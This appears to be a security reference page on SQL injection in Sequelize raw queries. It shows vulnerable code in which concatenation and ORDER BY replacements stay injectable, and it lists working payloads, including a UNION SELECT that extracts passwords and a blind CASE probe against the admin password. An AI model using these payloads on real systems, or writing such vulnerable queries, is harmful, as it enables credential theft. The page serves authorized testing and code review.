---
title: "Sequelize replacement injection: unsafe use of replacements and second-order values"
description: Mixing :replacements with string concatenation, or feeding attacker-controlled identifiers through replacements, reintroduces SQL injection in Sequelize raw queries.
keywords:
  - Sequelize
  - replacement injection
  - replacements
  - named parameters
  - second-order injection
  - SQL injection
---

# Sequelize replacement injection

Sequelize `replacements` substitute `:name`/`?` tokens with **escaped values** before the query runs. That is safe for *values*—but the mechanism is string substitution, not true prepared-statement binding, and several patterns defeat it: concatenating alongside replacements, using replacements for identifiers, and second-order reuse of stored data.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable patterns

**Concatenation next to replacements** — the interpolated part is unprotected:

```js
await sequelize.query(
  "SELECT * FROM users WHERE name = :name AND role = '" + role + "'",
  { replacements: { name } }
);
```

**Replacement into an identifier/structural position** — escaping is for values, so a column/table/`ORDER BY` slot stays injectable:

```js
await sequelize.query(
  "SELECT * FROM users ORDER BY :col",
  { replacements: { col: req.query.sort } }
);
```

**Second-order** — a value stored safely earlier is later concatenated into another raw query without replacements.

## Exploitation

For the concatenated `role` slot, inject as a normal quoted-string context:

```
' OR '1'='1
' UNION SELECT username, password, NULL FROM users --
```

For the identifier/`ORDER BY` slot, there is no quote to escape—replacement value-escaping does not neutralize structural SQL, so inject expressions directly:

```
(CASE WHEN (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') THEN 1 ELSE 2 END)
```

Second-order payloads are stored benign and triggered when the later concatenating query runs; they bypass input-time inspection entirely. The lesson for exploitation is that the presence of `replacements` does **not** guarantee safety—inspect every slot for whether it is a value (escaped) or a structural/concatenated position (injectable).

## References

- [Sequelize docs: Raw queries — replacements vs bind](https://sequelize.org/docs/v6/core-concepts/raw-queries/#replacements)
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
